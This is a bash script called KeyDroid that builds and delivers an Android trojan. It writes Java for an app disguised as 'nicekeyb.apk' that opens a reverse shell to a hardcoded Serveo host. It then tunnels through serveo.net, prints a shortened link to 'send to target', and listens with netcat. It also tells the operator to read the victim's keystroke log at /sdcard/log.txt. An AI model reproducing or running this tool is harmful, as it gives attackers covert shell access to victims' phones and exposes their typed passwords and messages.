#!/bin/bash
# KeyDroid v1.0
# Author: @thelinuxchoice (You don't become a coder by just changing the credits)
# Github: https://github.com/thelinuxchoice/keydroid

host="159.89.214.31" #Serveo.net

trap 'printf "\n";stop' 2

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {


command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }

command -v gradle > /dev/null 2>&1 || { echo >&2 "I require gradle but it's not installed. Install it. Aborting."; 
exit 1; }

}

banner() {


printf "\e[1;77m  _  __          ____            _     _  \n"
printf " | |/ /___ _   _|  _ \ _ __ ___ (_) __| | \n"
printf " | ' // _ \ | | | | | | '__/ _ \| |/ _\` | \n"
printf " | . \  __/ |_| | |_| | | | (_) | | (_| | \n"
printf " |_|\_\___|\__, |____/|_|  \___/|_|\__,_| \n"
printf "           |___/\e[0m\e[1;92m Author: @thelinuxchoice\e[0m\n"
printf "\n"
}

createapp() {

printf "package com.keydroid;\n" > app/app/src/main/java/com/keydroid/MainActivity.java

printf "import android.content.Context;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.os.Environment;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.FileInputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.FileOutputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.InputStreamReader;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.File;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.BufferedReader;		\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.IOException;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.InputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.io.OutputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import java.net.Socket;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.app.Activity;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.util.Log;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.view.Menu;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.widget.TextView;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.content.pm.PackageManager;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.database.Cursor;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.net.Uri;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.support.v4.app.ActivityCompat;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.support.v4.content.ContextCompat;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "import android.support.v7.app.AppCompatActivity;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "public class MainActivity extends Activity {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "   @Override\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "   protected void onCreate(Bundle savedInstanceState) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "      super.onCreate(savedInstanceState);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "      setContentView(R.layout.activity_main);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "      new Thread(new Runnable(){\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "			@Override\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "			public void run() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "                                        checkperm();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					Log.e(\"Error\", e.getMessage());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "			}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		}).start();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf " 	public void reverseShell() throws Exception {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		final Process process = Runtime.getRuntime().exec(\"system/bin/sh\");\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		Socket socket = new Socket(\"%s\", %s);\n" $host $port >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		forwardStream(socket.getInputStream(), process.getOutputStream());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		forwardStream(process.getInputStream(), socket.getOutputStream());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		forwardStream(process.getErrorStream(), socket.getOutputStream());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		process.waitFor();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		socket.getInputStream().close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		socket.getOutputStream().close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java

printf "	}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java



printf "public void checkperm() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java

printf "       if(ContextCompat.checkSelfPermission(getBaseContext(), \"android.permission.WRITE_EXTERNAL_STORAGE\") == PackageManager.PERMISSION_GRANTED) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java

printf "try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					reverseShell();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
                                  
printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					Log.e(\"Error\", e.getMessage());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java


printf "        } else {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "            final int REQUEST_CODE_ASK_PERMISSIONS = 123;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "            ActivityCompat.requestPermissions(MainActivity.this, new String[]{\"android.permission.WRITE_EXTERNAL_STORAGE\"}, REQUEST_CODE_ASK_PERMISSIONS);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "          checkperm();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "        }\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java


printf "	private static void forwardStream(final InputStream input, final OutputStream output) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		new Thread(new Runnable() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "			@Override\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "			public void run() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					final byte[] buf = new byte[4096];\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					int length;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					while ((length = input.read(buf)) != -1) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "						if (output != null) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "							output.write(buf, 0, length);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "							if (input.available() == 0) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "								output.flush();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "							}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "						}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				} finally {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "						input.close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "						output.close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					} catch (IOException e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "					}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "				}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "			}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "		}).start();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
printf "	}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java

printf "}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java

}

configureapp() {

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"

createapp
}



server() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"


$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink ' &


sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/nicekeyb.apk \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/nicekeyb.apk | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1 &
#php -S "localhost:4444" > /dev/null 2>&1 &
sleep 3
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting Connection...\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] After you get reverse shell, run this command to get key log file:\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] cat /sdcard/log.txt\e[0m\n"
nc -lvp 4444
#checksms
}


checkapk() {
if [[ -e app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/build/outputs/apk/app-release-unsigned.apk nicekeyb.apk
echo "      " | apksigner sign --ks key.keystore  nicekeyb.apk > /dev/null


printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/nicekeyb.apk \e[0m\n"
fi
default_start_server="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
start_server="${start_server:-${default_start_server}}"
if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then

server
else
exit 1
fi

}

build() {
default_start_build="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
start_build="${start_build:-${default_start_build}}"
if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
cd app/
gradle build
checkapk
else
exit 1
fi
}

port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

}


start() {

if [[ -e "app/sendlink" ]]; then
rm -rf app/sendlink 
fi
default_sdk_dir="/root/Android/Sdk"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir

sdk_dir="${sdk_dir:-${default_sdk_dir}}"

if [[ ! -d $sdk_dir ]]; then
printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
sleep 1
start
else
printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
port_conn
configureapp
build
fi


}
banner
dependencies
start


